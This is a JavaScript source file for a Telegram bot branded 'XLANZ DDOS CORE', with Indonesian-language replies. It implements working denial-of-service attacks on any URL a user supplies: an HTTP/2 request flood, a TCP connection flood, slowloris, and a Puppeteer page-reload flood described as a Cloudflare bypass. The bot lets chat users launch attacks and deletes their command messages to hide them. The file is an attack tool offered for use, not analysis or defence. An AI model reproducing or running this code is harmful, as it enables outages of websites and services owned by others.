const { Telegraf } = require("telegraf");
const http2 = require("http2");
const net = require("net");
const puppeteer = require("puppeteer");

const bot = new Telegraf("ISI_TOKEN_BOT_LO");

const methods = {
  http2: (target, threads = 100, duration = 60) => {
    const end = Date.now() + duration * 1000;
    const flood = () => {
      if (Date.now() > end) return;
      for (let i = 0; i < threads; i++) {
        try {
          const client = http2.connect(target);
          const req = client.request({ ":method": "GET", ":path": "/" });
          req.on("error", () => {});
          req.end();
          setTimeout(() => client.close(), 1000);
        } catch {}
      }
      setTimeout(flood, 100);
    };
    flood();
  },

  tcp: (target, threads = 100, duration = 60) => {
    const { hostname, port } = new URL(target);
    const end = Date.now() + duration * 1000;
    const flood = () => {
      if (Date.now() > end) return;
      for (let i = 0; i < threads; i++) {
        try {
          const socket = net.connect(port || 80, hostname, () => {
            socket.write("GET / HTTP/1.1\r\nHost: " + hostname + "\r\n\r\n");
          });
          socket.on("error", () => {});
        } catch {}
      }
      setTimeout(flood, 100);
    };
    flood();
  },

  slowloris: (target, threads = 100, duration = 60) => {
    const { hostname, port } = new URL(target);
    const end = Date.now() + duration * 1000;
    for (let i = 0; i < threads; i++) {
      const socket = net.connect(port || 80, hostname, () => {
        socket.write("POST / HTTP/1.1\r\nHost: " + hostname + "\r\n");
        const slow = setInterval(() => {
          if (Date.now() > end) {
            clearInterval(slow);
            return socket.destroy();
          }
          socket.write("X-a: b\r\n");
        }, 1000);
      });
      socket.on("error", () => {});
    }
  },

  uam: async (target, threads = 1, duration = 60) => {
    const end = Date.now() + duration * 1000;
    const attack = async () => {
      const browser = await puppeteer.launch({ headless: "new" });
      const page = await browser.newPage();
      try {
        await page.goto(target, { waitUntil: "networkidle2", timeout: 30000 });
        for (let i = 0; i < threads; i++) {
          await page.reload({ waitUntil: "domcontentloaded" });
        }
      } catch {}
      await browser.close();
    };
    while (Date.now() < end) {
      await attack();
    }
  },
};

bot.command("menu", (ctx) => {
  ctx.reply(`
╔═[ XLANZ DDOS CORE ]
║ Gunakan: /ddos <method> <url> <threads> <detik>
║
║ ▶ Method Available:
║ ├─ http2
║ ├─ tcp
║ ├─ slowloris
║ └─ uam (bypass cf)
║
║ Contoh:
║   /ddos http2 https://target.com 150 60
╚═[ Powered by Lhuciver & BloodEvil Ai ]
`);
});

bot.command("ddos", async (ctx) => {
  try {
    const [_, method, target, threads, duration] = ctx.message.text.split(" ");
    if (!method || !target) return ctx.reply("Format salah, ketik /menu untuk bantuan.");
    if (!methods[method]) return ctx.reply(`Method '${method}' tidak ditemukan.`);

    await ctx.deleteMessage(); // Auto hapus command user

    ctx.reply(`
⚔️ XLANZ DDOS CORE ⚔️
• Target: ${target}
• Method: ${method.toUpperCase()}
• Threads: ${threads}
• Durasi: ${duration} detik
⚠️ Serangan sedang berjalan...
`);

    methods[method](target, parseInt(threads), parseInt(duration));

    setTimeout(() => {
      ctx.reply(`✅ Serangan ke ${target} telah selesai!`);
    }, parseInt(duration) * 1000);

  } catch (err) {
    ctx.reply("Terjadi error saat menjalankan command!");
    console.error(err);
  }
});

bot.launch();
console.log("XLANZ DDOS BOT Aktif.");